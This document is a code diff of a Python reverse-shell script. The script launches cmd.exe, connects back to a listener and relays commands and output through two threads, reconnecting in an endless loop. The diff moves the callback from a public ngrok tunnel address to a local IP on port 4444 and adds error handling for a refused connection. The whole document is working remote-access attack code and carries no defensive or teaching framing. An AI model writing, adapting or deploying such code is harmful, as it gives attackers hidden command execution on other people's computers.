@@ -1,3 +1,4 @@
+
 import socket
 import os
 import threading
@@ -7,7 +8,12 @@ import time
 def rev():
    p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
    s = socket.socket()
-   s.connect(('4.tcp.eu.ngrok.io', 19814))
+
+   try:
+       s.connect(('192.168.1.16', 4444))
+   except ConnectionRefusedError as e:
+       print(f'refused ... Check if listener is running.')
+       return
 
    def s_o():
        while True:
@@ -17,7 +23,7 @@ def rev():
                    break
                s.sendall(output)
            except Exception as e:
-               print("Error sending output:", e)
+               print('Error sending output:', e)
                break
 
    def r_i():
@@ -29,14 +35,14 @@ def rev():
                p.stdin.write(data)
                p.stdin.flush()
            except Exception as e:
-               print("Error receiving input:", e)
+               print('Error receiving input:', e)
                break
 
    threading.Thread(target=s_o, daemon=True).start()
    threading.Thread(target=r_i, daemon=True).start()
 
-   time.sleep(20)
+   time.sleep(30)
 
 while True:
    rev()
-   print("Loading ...")
+   print('Loading ...')
